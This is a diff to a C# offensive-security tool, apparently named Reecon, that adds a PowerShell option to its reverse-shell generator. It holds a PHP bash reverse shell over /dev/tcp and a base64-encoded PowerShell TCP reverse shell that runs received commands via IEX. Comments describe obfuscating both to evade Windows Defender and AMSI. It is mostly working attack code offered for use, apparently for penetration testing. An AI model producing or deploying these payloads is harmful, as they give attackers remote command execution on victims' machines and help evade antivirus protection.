@@ -12,7 +12,7 @@ namespace Reecon
             if (args.Length < 2)
             {
                 Console.WriteLine("Shell Usage: reecon -shell shellType [IP Port]");
-                Console.WriteLine("Types: bash, haskell, jar, jsp, nc, nodejs, php, python, war");
+                Console.WriteLine("Types: bash, haskell, jar, jsp, nc, nodejs, php, powershell, python, war");
                 General.PrintIPList();
                 return;
             }
@@ -25,6 +25,7 @@ namespace Reecon
             {
                 Console.WriteLine("Don't forget to change the IP / Port!");
                 General.PrintIPList();
+                Console.WriteLine($"-> Generating shell with IP {ip} and Port {port}");
             }
             if (args.Length == 3)
             {
@@ -88,6 +89,12 @@ namespace Reecon
                 Console.WriteLine("PHP Shell");
                 Console.WriteLine("---------");
                 Console.WriteLine(PHPShell(ip, port));
+            }
+            else if (shellType == "powershell")
+            {
+                Console.WriteLine("Powershell Shell");
+                Console.WriteLine("----------------");
+                Console.WriteLine(PowershellShell(ip, port));
             }
             else if (shellType == "python")
             {
@@ -181,13 +188,28 @@ namespace Reecon
         private static string PHPShell(string ip, string port)
         {
             string plainShell = $"exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\");";
-            string b64Shell = System.Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
+            string b64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
             // Space is to bypass Windows Defender definitions
             // Still gets picked up by "bkav" though - Will deal with later if needed
             string evalShell = "eva" + "l(base64_decode('" + b64Shell + "'));";
             return "Regular: <?php " + plainShell + " ?>" + Environment.NewLine
                 + "Safer: <?php " + evalShell + " ?>" + Environment.NewLine
                 + "No Upload: php -r \"" + evalShell + "\"";
+        }
+
+        private static string PowershellShell(string ip, string port)
+        {
+            // Encrypted to stop AV's from picking it up - Super annoying cat and mouse game...
+            // This version has a very minor AMSI bypass so you won't get
+            // "This script contains malicious content and has been blocked by your antivirus software."
+            string encryptedShell = "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiSVBIRVJFIixQT1JUSEVSRSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpVVEY4KS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgp";
+            string plainTextShell = Encoding.UTF8.GetString(Convert.FromBase64String(encryptedShell));
+            plainTextShell = plainTextShell.Replace("IPHERE", ip).Replace("PORTHERE", port);
+            string b64Shell = Convert.ToBase64String(ASCIIEncoding.UTF8.GetBytes(plainTextShell));
+            string toReturn = ""; // To make things neat :p
+            toReturn += "Normal: powershell IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"" + b64Shell + "\")))" + Environment.NewLine + Environment.NewLine;
+            toReturn += "Escaped: powershell IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\\\"" + b64Shell + "\\\")))";
+            return toReturn;
         }
 
         private static string PythonShell(string ip, string port)
